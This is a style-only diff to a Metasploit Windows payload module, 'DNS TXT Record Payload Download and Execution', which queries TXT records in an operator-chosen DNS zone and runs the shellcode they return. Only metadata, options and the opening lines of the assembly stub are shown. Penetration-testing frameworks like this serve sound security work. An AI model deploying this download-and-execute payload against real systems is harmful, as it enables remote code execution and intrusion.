@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 module MetasploitModule
-
   CachedSize = 285
 
   include Msf::Payload::Windows
@@ -14,16 +14,15 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'DNS TXT Record Payload Download and Execution',
-      'Description'   => 'Performs a TXT query against a series of DNS record(s) and executes the returned payload',
-      'Author'        =>
-        [
-          'corelanc0d3r <peter.ve[at]corelan.be>'
-        ],
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'win',
-      'Arch'          => ARCH_X86
-    ))
+                     'Name'          => 'DNS TXT Record Payload Download and Execution',
+                     'Description'   => 'Performs a TXT query against a series of DNS record(s) and executes the returned payload',
+                     'Author'        =>
+                       [
+                         'corelanc0d3r <peter.ve[at]corelan.be>'
+                       ],
+                     'License'       => MSF_LICENSE,
+                     'Platform'      => 'win',
+                     'Arch'          => ARCH_X86))
 
     # EXITFUNC is not supported
     deregister_options('EXITFUNC')
@@ -31,8 +30,9 @@ module MetasploitModule
     # Register command execution options
     register_options(
       [
-        OptString.new('DNSZONE', [ true, "The DNS zone to query" ]),
-      ], self.class)
+        OptString.new('DNSZONE', [ true, "The DNS zone to query" ])
+      ], self.class
+    )
   end
 
   #
@@ -60,20 +60,19 @@ module MetasploitModule
   # c.corelan.eu	: contains the last 144 bytes of the alpha shellcode
 
   def generate
-
-    dnsname		= datastore['DNSZONE']
-    wType		= 0x0010	#DNS_TYPE_TEXT (TEXT)
+    dnsname	= datastore['DNSZONE']
+    wType	= 0x0010	# DNS_TYPE_TEXT (TEXT)
     wTypeOffset	= 0x1c
 
     queryoptions	= 0x248
-      # DNS_QUERY_RETURN_MESSAGE (0x200)
-      # DNS_QUERY_BYPASS_CACHE (0x08)
-      # DNS_QUERY_NO_HOSTS_FILE (0x40)
-      # DNS_QUERY_ONLY_TCP (0x02) <- not used atm
+    # DNS_QUERY_RETURN_MESSAGE (0x200)
+    # DNS_QUERY_BYPASS_CACHE (0x08)
+    # DNS_QUERY_NO_HOSTS_FILE (0x40)
+    # DNS_QUERY_ONLY_TCP (0x02) <- not used atm
 
-    bufferreg 	= "edi"
+    bufferreg	= "edi"
 
-    #create actual payload
+    # create actual payload
     payload_data = <<EOS
   cld			; clear direction flag
   call start		; start main routine
